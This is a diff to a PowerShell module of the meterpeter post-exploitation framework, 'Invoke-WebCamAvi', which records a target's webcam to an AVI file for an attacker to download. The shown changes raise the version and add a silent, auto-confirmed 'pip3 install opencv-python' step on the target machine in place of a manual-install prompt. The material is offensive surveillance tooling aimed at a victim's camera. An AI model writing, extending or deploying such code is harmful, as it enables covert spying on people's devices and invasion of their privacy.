@@ -7,7 +7,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: python3 {opencv-python}
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.3
+   PS cmdlet Dev version: v1.0.4
 
 .DESCRIPTION
    Auxiliary Module of meterpeter v2.10.12 that uses opencv-python to record
@@ -15,6 +15,7 @@
 
 .NOTES
    Remark: recording of webcam turns 'on' the camera ligth.
+   Remark: cmdlet will auto-install 'opencv-python' using pip3 (silent)
    Parameter RecTime accepts values from 5 seconds (minimum) up to 60 seconds (max)
    to prevent the AVI file to be very large if attacker needs to download it from target.
    Alternatively -Force 'true' parameter can be used to bypass some cmdlet restrictions.
@@ -72,7 +73,7 @@
 )
 
 
-$cmdletver = "v1.0.1"
+$cmdletver = "v1.0.4"
 $StartPath = (Get-Location).Path
 $ErrorActionPreference = "SilentlyContinue"
 $host.UI.RawUI.WindowTitle = "@Invoke-WebCamAvi $cmdletver"
@@ -109,8 +110,14 @@ If($Force -ieq "false")
       write-host "x " -ForegroundColor Red -NoNewline
       write-host "Error: " -ForegroundColor DarkGray -NoNewline
       write-host "Module requires opencv-python installed." -ForegroundColor Red
-      write-host "  => Manual: pip3 install opencv-python" -ForegroundColor DarkYellow
-      return
+      Start-Sleep -Seconds 1
+
+      write-host "  => " -ForegroundColor Yellow -NoNewline
+      write-host "Installing:'" -ForegroundColor DarkGray -NoNewline
+      write-host "pip3 install opencv-python --quiet" -ForegroundColor Green -NoNewline
+      write-host "'`n" -ForegroundColor DarkGray
+      echo y|pip3 install opencv-python --quiet --exists-action ignore #Auto-Install dependencies
+      write-host ""
    }
 }
 
